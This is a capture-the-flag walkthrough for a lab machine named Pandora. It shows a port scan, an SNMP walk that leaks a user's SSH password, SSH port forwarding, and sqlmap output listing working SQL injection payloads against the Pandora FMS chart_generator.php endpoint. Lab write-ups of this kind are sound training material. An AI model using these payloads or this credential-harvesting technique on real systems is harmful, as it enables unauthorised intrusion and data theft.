# Pandora

1. Nmap TCP and UDP port with script
````
# nmap -sS -p- pandora.htb -oG 10.10.11.136-sS
# nmap -sU -p- pandora.htb -oG 10.10.11.136-sU
````

````
# snmpwalk -v2c -c public 10.10.11.136:161 1.3.6.1.2.1.25.4.2.1 > 10.10.11.136-snmpwalk
````

~iso.3.6.1.2.1.25.4.2.1.5.864 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"~

~iso.3.6.1.2.1.25.4.2.1.5.1107 = STRING: "-u daniel -p HotelBabylon23"~

2. Login into remote server
````
# ssh daniel@10.10.11.136
````

3. Enumerates
````
daniel@pandora:~$ ss -nlpt
State          Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process         
LISTEN         0               80                           127.0.0.1:3306                        0.0.0.0:*                            
LISTEN         0               4096                     127.0.0.53%lo:53                          0.0.0.0:*                            
LISTEN         0               128                            0.0.0.0:22                          0.0.0.0:*                            
LISTEN         0               511                                  *:80                                *:*                            
LISTEN         0               128                               [::]:22                             [::]:*                            
daniel@pandora:~$ curl http://127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
````

4. Login redirecting the remote port
````
# ssh -L80:127.0.0.1:80 daniel@10.10.11.136
````

5. Enumarates
````
v7.0NG.742_FIX_PERL2020
````
- [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
- [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)

6. Scan
````
# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*'
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=-3520' OR 1191=1191#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 5536 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(5536=5536,1))),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VqwU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 8615 FROM (SELECT(SLEEP(5)))jdWS)-- MiTJ
---
[22:44:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:44:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'
````


[OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)
